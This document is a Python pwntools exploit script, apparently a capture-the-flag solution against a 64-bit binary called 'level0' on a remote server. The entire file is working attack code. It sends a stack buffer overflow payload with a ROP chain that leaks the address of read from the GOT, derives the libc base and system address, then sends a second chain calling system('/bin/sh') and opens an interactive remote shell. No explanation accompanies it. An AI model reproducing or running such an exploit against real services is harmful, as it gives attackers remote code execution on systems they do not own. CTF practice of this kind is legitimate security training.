from pwn import *
context(log_level = "debug")
elf = ELF('./level0')
libc = ELF('./x64_libc.so.6')
#target = process('./pwn_x64')
#target = remote('111.198.29.451', 30888)
target = remote('111.198.29.45',30888)
target.recvuntil('Hello, World')
read_got = elf.got['read']
write_plt = elf.symbols['write']
ret_addr = 0x4005A6
rdi_ret = 0x400663
rsi_ret = 0x400661
def debug():
    addr = int(raw_input("DEBUG: "), 16)
    gdb.attach(target, "b *" + str(addr))


print hex(write_plt)

#debug()

payload = 'a' * 136 + p64(rdi_ret) + p64(1)
payload += p64(rsi_ret) 
payload += p64(read_got)
payload += p64(1)
payload += p64(write_plt)
payload += p64(ret_addr)
target.send(payload)
target.recv(0x200)
read_addr = u64(target.recv(8))
print hex(read_addr)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
binsh = next(libc.search("/bin/sh\x00")) + libc_base
payload = 'a' * 136 + p64(rdi_ret)
payload += p64(binsh)
payload += p64(system_addr)
target.send(payload)
target.interactive()
